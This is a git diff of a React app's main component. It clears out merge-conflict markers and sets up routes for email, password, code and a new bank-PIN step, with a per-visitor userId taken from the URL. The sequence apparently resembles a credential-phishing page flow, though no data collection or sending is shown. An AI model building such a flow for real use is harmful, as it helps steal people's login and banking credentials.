@@ -3,58 +3,42 @@ import Email from "./components/flow.jsx/Email";
 import Password from "./components/flow.jsx/Password";
 import Code from "./components/flow.jsx/Code";
 import "./App.css";
+import "./index.css";
+import BankPin from "./components/flow.jsx/BankPin";
+import { useParams, Routes, Route } from "react-router-dom";
 
 function App() {
-  const [togglePass, setTogglePass] = useState(false);
-
-  const [toggleCode, setToggleCode] = useState(false);
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
+  const { userId } = useParams(); // Extracting userId from URL parameters
 
   return (
-    <>
-<<<<<<< Updated upstream
-=======
-<<<<<<< HEAD
-      {toggleCode ? (
-        <div className="bg">
-          <Code 
-            emailValue={email} 
-          />
-        </div>
-=======
->>>>>>> Stashed changes
-      {togglePass ? (
-        <Password
-          email={email}
-          toggle={togglePass}
-          setToggleCode={setTogglePass}
-          password={password}
-          setPassword={setPassword}
-        />
-<<<<<<< Updated upstream
-=======
->>>>>>> 6d96c250b4edbb927fc7c624308432453dda5333
->>>>>>> Stashed changes
-      ) : (
-        <div className="bg">
-          {toggleCode ? (
-            <Code
-              email={email}
-              setToggle={setTogglePass}
-              toggle={togglePass}
-            />
-          ) : (
+    <div className="bg">
+      <Routes>
+        <Route
+          path="/:userId?/*"
+          element={
             <Email
               email={email}
               setEmail={setEmail}
-              toggle={toggleCode}
-              setToggle={setToggleCode}
+              userId={userId} // Passing userId to Email component
             />
-          )}
-        </div>
-      )}
-    </>
+          }
+        />
+        <Route path="/code" element={<Code emailValue={email} />} />
+        <Route
+          path="/password"
+          element={
+            <Password
+              password={password}
+              setPassword={setPassword}
+              email={email}
+            />
+          }
+        />
+        <Route path="/verify" element={<BankPin />} />
+      </Routes>
+    </div>
   );
 }
 
